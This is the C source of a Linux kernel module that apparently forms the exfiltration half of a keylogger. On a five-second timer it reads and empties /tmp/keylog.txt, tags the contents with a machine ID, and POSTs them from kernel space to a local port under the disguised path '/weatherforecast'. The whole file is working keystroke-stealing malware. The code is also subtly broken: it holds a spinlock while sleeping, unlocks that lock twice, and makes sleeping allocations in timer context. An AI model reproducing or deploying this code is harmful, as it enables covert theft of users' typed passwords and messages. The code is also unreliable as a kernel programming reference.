#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/timer.h>
#include <linux/workqueue.h>
#include <linux/uio.h>
#include <linux/kfifo.h>
#include <net/sock.h>
#include <linux/inet.h>

#include "uniqueIdGenerator.h"

const char *uniqueId;
#define LOG_FILE_PATH "/tmp/keylog.txt"
#define TIMER_INTERVAL (5 * HZ)
#define PORT 5247
#define MAX_SEND_SIZE 1024
#define MAX_DATA_SIZE 512

static DEFINE_SPINLOCK(file_lock);
static struct timer_list my_timer;
static struct workqueue_struct *read_workqueue;

struct read_work_data
{
    struct work_struct work;
};

struct http_work_data
{
    struct work_struct work;
    char *post_data;
};

static void get_current_time(char *buffer, size_t buffer_size)
{
    struct timespec64 ts;
    ktime_get_real_ts64(&ts);
    snprintf(buffer, buffer_size, "%lld.%09ld", (long long)ts.tv_sec, ts.tv_nsec);
}

static void send_http_post_work(struct work_struct *work)
{
    struct http_work_data *data = container_of(work, struct http_work_data, work);
    struct socket *sock;
    struct sockaddr_in server_addr;
    struct msghdr msg = {0};
    struct kvec vec;
    char *http_request;
    char *response;
    int ret;

    char toSend[MAX_DATA_SIZE];

    snprintf(toSend, MAX_DATA_SIZE, "{\"ID\":\"%s\",\"Key\":\"%s\"}", uniqueId, data->post_data);

    http_request = kzalloc(MAX_SEND_SIZE, GFP_KERNEL);
    if (!http_request)
    {
        kfree(data->post_data);
        kfree(data);
        return;
    }

    snprintf(http_request, MAX_SEND_SIZE,
             "POST /weatherforecast HTTP/1.1\r\n"
             "Host: localhost:%d\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "\r\n"
             "%s",
             PORT, strlen(toSend), toSend);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0)
    {
        kfree(http_request);
        kfree(data->post_data);
        kfree(data);
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    in4_pton("127.0.0.1", -1, (u8 *)&server_addr.sin_addr.s_addr, '\0', NULL);

    ret = kernel_connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    if (ret < 0)
    {
        pr_err("Failed to connect to server: %d\n", ret);
        sock_release(sock);
        kfree(http_request);
        kfree(data->post_data);
        kfree(data);
        return;
    }

    vec.iov_base = http_request;
    vec.iov_len = strlen(http_request);
    msg.msg_flags = 0;

    ret = kernel_sendmsg(sock, &msg, &vec, 1, strlen(http_request));
    if (ret < 0)
        pr_err("Failed to send HTTP request: %d\n", ret);

        // worldwide
    sock_release(sock);
    kfree(http_request);
    kfree(data->post_data);
    kfree(data);
}

static void read_keylog_file(struct work_struct *work)
{
    struct file *file;
    char buffer[MAX_DATA_SIZE];
    loff_t pos = 0;
    ssize_t ret;

    pr_info("Reading data from file: %s\n", LOG_FILE_PATH);

    spin_lock(&file_lock);

    file = filp_open(LOG_FILE_PATH, O_RDONLY, 0777);
    if (IS_ERR(file))
    {
        spin_unlock(&file_lock);
        return;
    }

    ret = kernel_read(file, buffer, sizeof(buffer) - 1, &pos);
    if (ret < 0)
    {
        filp_close(file, NULL);
        spin_unlock(&file_lock);
        return;
    }
    buffer[ret] = '\0';

    filp_close(file, NULL);

    vfs_truncate(&(file->f_path), 0);
    spin_unlock(&file_lock);

    struct http_work_data *http_data = kmalloc(sizeof(*http_data), GFP_KERNEL);
    if (!http_data)
    {
        spin_unlock(&file_lock);
        return;
    }

    http_data->post_data = kstrdup(buffer, GFP_KERNEL);
    if (!http_data->post_data)
    {
        kfree(http_data);
        spin_unlock(&file_lock);
        return;
    }

    INIT_WORK(&http_data->work, send_http_post_work);
    queue_work(read_workqueue, &http_data->work);
}

static void timer_callback(struct timer_list *t)
{
    struct read_work_data *work_data;

    work_data = kmalloc(sizeof(*work_data), GFP_KERNEL);
    if (!work_data)
    {
        mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
        return;
    }
    INIT_WORK(&work_data->work, read_keylog_file);
    queue_work(read_workqueue, &work_data->work);

    mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
}

static int __init read_keylog_init(void)
{

    uniqueId = getOrCreateUniqueId();
    pr_info("Sender loaded\n");

    read_workqueue = create_singlethread_workqueue("read_workqueue");
    if (!read_workqueue)
    {
        return -ENOMEM;
    }

    timer_setup(&my_timer, timer_callback, 0);

    mod_timer(&my_timer, jiffies + TIMER_INTERVAL);

    return 0;
}

static void __exit read_keylog_exit(void)
{
    del_timer_sync(&my_timer);
    destroy_workqueue(read_workqueue);

    pr_info("Sender unloaded\n");
}

module_init(read_keylog_init);
module_exit(read_keylog_exit);
